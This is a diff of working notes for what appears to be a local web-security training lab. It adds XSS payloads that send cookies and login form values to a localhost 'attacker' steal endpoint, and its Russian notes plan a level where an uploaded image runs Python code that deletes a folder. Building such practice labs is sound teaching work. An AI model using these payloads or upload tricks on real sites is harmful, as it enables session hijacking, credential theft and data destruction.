@@ -7,10 +7,27 @@
 
 <script>fetch('http://localhost:8080/attacker/xss/steal?username=' + encodeURIComponent(document.getElementById('username').value) + '&password=' + encodeURIComponent(document.getElementById('password').value));</script>
 
+``` xss
+<script>
+  new Image().src = 'http://localhost:8080/attacker/xss/steal?cookie=' + document.cookie;
+</script>
 
 
+<script>
+  location.href = "http://localhost:8080/attacker/xss/steal?cookie=" + document.cookie;
+</script>
 
+```
+
+
+```csrf
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://localhost:8080/attacker/xss/steal?cookie=' + encodeURIComponent(document.cookie), true);
+xhr.withCredentials = true;
+xhr.send();
+```
 
 так, стоп 2 уровень это загрузка картинки с вредоносным кодом, желательно чтобы это был какой-то простой код и желательно не на пхп, который сразу будет исполнен
 например загрузка картинки  с py кодом, который удалит папку а сервер будет проверять ее наличие и в случае успеха перекинет на 3 урвень
 соответсвтенно форма загрузки файла и кнопка показать картику, когда картика читается выполняется py код.
+
